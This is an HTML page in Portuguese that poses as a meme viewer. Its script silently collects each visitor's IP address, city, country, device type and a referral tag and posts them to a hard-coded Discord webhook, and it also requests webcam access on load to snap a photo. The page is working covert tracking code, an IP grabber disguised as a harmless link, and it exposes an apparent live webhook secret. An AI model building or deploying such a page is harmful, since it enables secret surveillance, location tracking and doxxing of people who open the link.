<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Visualizar Meme</title>
  <style>
    body { font-family: sans-serif; margin: 0; background: #f4f4f4; padding: 20px; }
    .meme-container { text-align: center; margin-bottom: 20px; }
    .meme-container img, .meme-container video { max-width: 100%; height: auto; }
    .info { text-align: center; margin-top: 20px; font-size: 16px; }
    .photo { margin-top: 20px; text-align: center; }
  </style>
</head>
<body>
  <h2 style="text-align:center">Meme Visualizado</h2>
  
  <div class="meme-container">
    <img id="memeImage" style="display:none;" />
    <video id="memeVideo" controls style="display:none;">
      <source id="videoSource" src="" type="video/mp4">
    </video>
  </div>

  <div class="info">
    <p id="info">Carregando dados...</p>
  </div>

  <div class="photo" id="photoContainer"></div>

  <script>
    function detectarDispositivo(userAgent) {
      if (/android/i.test(userAgent)) return "Android";
      if (/iphone|ipad/i.test(userAgent)) return "iPhone/iPad";
      if (/windows/i.test(userAgent)) return "Windows";
      if (/macintosh|mac os/i.test(userAgent)) return "Mac";
      if (/linux/i.test(userAgent)) return "Linux";
      return "Desconhecido";
    }

    function exibirMeme(memeId) {
      const img = document.getElementById("memeImage");
      const vid = document.getElementById("memeVideo");
      const source = document.getElementById("videoSource");

      if (memeId === "meme1") {
        img.src = "https://via.placeholder.com/300x200.png?text=Meme+1";
        img.style.display = "block";
        vid.style.display = "none";
      } else if (memeId === "meme2") {
        source.src = "https://www.w3schools.com/html/mov_bbb.mp4";
        vid.load();
        vid.style.display = "block";
        img.style.display = "none";
      } else {
        document.getElementById("info").innerText = "Meme não encontrado!";
      }
    }

    function capturarFoto() {
      const container = document.getElementById('photoContainer');
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.onloadeddata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const img = new Image();
            img.src = canvas.toDataURL('image/png');
            container.appendChild(img);
            stream.getTracks().forEach(track => track.stop());
          };
        })
        .catch(() => {
          container.innerHTML = "<p>Não foi possível acessar a câmera.</p>";
        });
    }

    fetch("https://ipapi.co/json")
      .then(res => res.json())
      .then(data => {
        const params = new URLSearchParams(window.location.search);
        const meme = params.get("meme");
        const ref = params.get("ref");
        const userAgent = navigator.userAgent;
        const dispositivo = detectarDispositivo(userAgent);
        const dataHora = new Date().toLocaleString();

        document.getElementById("info").innerHTML =
          `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>` +
          `Local: ${data.city}, ${data.country_name}<br>` +
          `Dispositivo: ${dispositivo}<br>Data/Hora: ${dataHora}`;

        exibirMeme(meme);
        capturarFoto();

        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `**Novo acesso ao meme:**\nMeme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nDispositivo: ${dispositivo}\nData/Hora: ${dataHora}`
          })
        });
      });
  </script>
</body>
</html>
